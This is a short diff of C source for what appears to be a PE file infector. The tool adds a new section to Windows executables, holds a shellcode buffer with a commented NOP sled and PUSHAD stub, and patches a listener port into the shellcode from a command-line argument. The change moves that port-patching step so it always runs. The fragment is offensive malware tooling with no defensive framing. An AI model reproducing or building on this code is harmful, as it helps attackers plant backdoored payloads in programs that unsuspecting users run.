@@ -179,7 +179,7 @@ int main(int argc, char *argv[])
 	unsigned int i,size, offset, offset2, x, end_size, y, count, shellcode_size,needle_len ;
 	IMAGE_SECTION_HEADER *new_ish;
 	char *shellcode,*needle_offset;
-	char patch[]="\x53\x53";
+	char patch_port[]="\x53\x53";
 	DWORD patch_offset;
 //char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //NOP SLED
 //"\x60";	//PUSHAD
@@ -265,12 +265,15 @@ for (count = 0; count < argc; count++)
 	if(!strcmp(argv[count],"-p"))
 	{
 		port = htons(atoi(argv[count+1]));
-		memmem(shellcode,shellcode_size,patch,sizeof(WORD),&patch_offset);
-		memcpy(shellcode+patch_offset,&port,sizeof(port));
 	}
 
 }
-
+	
+// Shellcode Patching PORT
+	memmem(shellcode,shellcode_size,patch_port,sizeof(WORD),&patch_offset);
+	memcpy(shellcode+patch_offset,&port,sizeof(port));
+	
+	
 	new_ish = (IMAGE_SECTION_HEADER *)calloc(sizeof(IMAGE_SECTION_HEADER),1);
 
 
